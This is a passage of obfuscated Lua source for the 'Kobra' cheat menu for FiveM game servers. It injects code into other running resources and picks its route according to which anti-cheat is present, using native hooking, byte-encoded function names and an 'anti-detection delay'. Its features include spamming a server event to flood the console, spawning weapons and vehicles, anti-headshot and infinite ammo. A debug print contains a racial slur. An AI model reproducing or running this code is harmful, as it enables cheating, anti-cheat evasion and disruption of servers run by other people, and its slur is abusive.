                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);else print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v563) if (v563 and (v563~="")) then v275:SpawnSelectedWeapon(v563);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v275:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v275:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1 + 0 ,values=v275:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v427) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v427));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1 -0 ,values=v275:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v428) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v428));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1 + 0 ,values=v275:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v429) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v429));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v275:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v430) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v430));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1370 -(213 + 1156) ,values=v275:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v431) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v431));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=1 -0 ,values=v275:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v432) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v432));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=3 -2 ,values=v275:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v433) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v433));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1351 -(540 + 810) ,values=v275:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v434) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v434));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=263 -(30 + 232) ,values=v275:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v435) v275:SpawnSelectedWeapon(v275:GetWeaponModelFromLabel(v435));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v436) if v436 then v275:Notify("success","Kobra","Enabled Infinite Ammo",1100 + 3900 );v275:EnableInfiniteAmmo();else v275:Notify("error","Kobra","Disabled Infinite Ammo",4550 + 450 );v275:DisableInfiniteAmmo();end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v437) if v437 then local v621=549 -(305 + 244) ;while true do if (0==v621) then v275:Notify("success","Kobra","Enabled Anti-Headshot",4639 + 361 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else local v622=0;while true do if ((105 -(95 + 10))==v622) then v275:Notify("error","Kobra","Disabled Anti-Headshot",3541 + 1459 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end break;end end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v438) v43=v438 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v439) v42=v439 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v564) if (v564 and (v564~="")) then v275:SpawnSelectedVehicle(v564,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v440) v275:SpawnSelectedVehicle(v440,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v441) v275:SpawnSelectedVehicle(v441,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v442) v275:SpawnSelectedVehicle(v442,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=4 -3 ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v443) v275:SpawnSelectedVehicle(v443,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=3 -2 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v444) v275:SpawnSelectedVehicle(v444,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v445) v275:SpawnSelectedVehicle(v445,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1 + 0 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v446) v275:SpawnSelectedVehicle(v446,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v447) v275:SpawnSelectedVehicle(v447,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v448) v275:SpawnSelectedVehicle(v448,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=3 -2 ,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v449) v275:SpawnSelectedVehicle(v449,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=822 -(344 + 477) ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v450) v275:SpawnSelectedVehicle(v450,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1167 -(228 + 938) ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v451) v275:SpawnSelectedVehicle(v451,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v452) v275:SpawnSelectedVehicle(v452,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v565) if (v565 and (v565~="")) then local v722=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v565);MachoInjectResourceRaw("any",v722);else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v275:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v453=0;while true do if (v453==(0 + 0)) then v12:Notify("success","Kobra","Cleaned Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v454=202 -(5 + 197) ;local v455;local v456;while true do if (v454==(686 -(339 + 347))) then v12:Notify("success","Kobra","Vehicle Max Upgraded",6799 -3799 );v455=GetResourceState("WaveShield")=="started" ;v454=1;end if (v454==1) then v456=GetResourceState("ReaperV4")=="started" ;if v455 then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);elseif v456 then local v1033=0 -0 ;while true do if (v1033==(376 -(365 + 11))) then print("using Reaper fallback");MachoInjectThread(0 + 0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

